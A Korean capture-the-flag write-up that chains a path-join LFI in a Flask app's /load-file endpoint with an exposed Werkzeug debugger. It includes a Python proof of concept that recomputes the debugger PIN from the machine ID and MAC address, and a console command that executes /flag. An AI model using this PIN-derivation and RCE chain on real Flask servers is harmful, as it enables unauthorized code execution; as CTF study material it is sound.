두가지 취약점을 활용해야 성공적으로 flag를 획득할 수 있습니다.
1. LFI 취약점
2. Flask Debug mode True 취약점

먼저 load-file 엔드포인트에서 ..을 막음으로써 상위 폴더로의 이동을 막고 있습니다.
그러나 os.path.join에서 뒤에 오는 인자가 절대경로이면 앞의값을 모두 버립니다.
따라서, filename을 절대 경로(ex. /etc/passwd)로 주면은 다른 상위 폴더의 파일을 읽을 수 있습니다.

두번째로, Flask프레임워크를 사용하는데 Debug mode가 True로 되어있습니다.
이때, 다른 설정 파일들을 읽어 PIN을 유추할 수 있고 RCE공격까지 진행할 수 있습니다.
(참고) https://ind2x.github.io/posts/flask_debugger_true_exploit_rce/

exploit과정은 아래와 같습니다.
1. machine-id 가져오기 (/proc/sys/kernel/random/boot_id)
2. MAC주소 가져오기 (/sys/class/net/eth0/address) => 10진수 변환
3. 아래 poc에 적절하게 적용

import hashlib
from itertools import chain
probably_public_bits = [
    'kmu', # username
    'flask.app',# modname 고정
    'Flask',    # getattr(app, '__name__', getattr(app.__class__, '__name__')) 고정
    '/usr/local/lib/python3.12/site-packages/flask/app.py' # getattr(mod, '__file__', None),
                                                          # python 버전 마다 위치 다름
]
 
private_bits = [
    '19938859674282',  # MAC주소를 int형으로 변환한 값
     # get_machine_id() /proc/sys/kernel/random/boot_id
    '022b007a-369c-4f8a-9e78-c31ac8301057'
]
 
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode("utf-8")
    h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')
 
cookie_name = f'__wzd{h.hexdigest()[:20]}'
 
num = None
if num is None:
    h.update(b"pinsalt")
    num = f"{int(h.hexdigest(), 16):09d}"[:9]
 
rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = "-".join(
                num[x : x + group_size].rjust(group_size, "0")
                for x in range(0, len(num), group_size)
            )
            break
    else:
        rv = num
print(rv)
print(cookie_name)


4. pin 획득
5. /load-file에 filename없이 접속 시 debug페이지 접속 가능
6. 획득한 pin 입력 => 콘솔획득
7. import subprocess;subprocess.Popen('/flag',shell=True,stdout=subprocess.PIPE).stdout.read() 입력 => flag 획득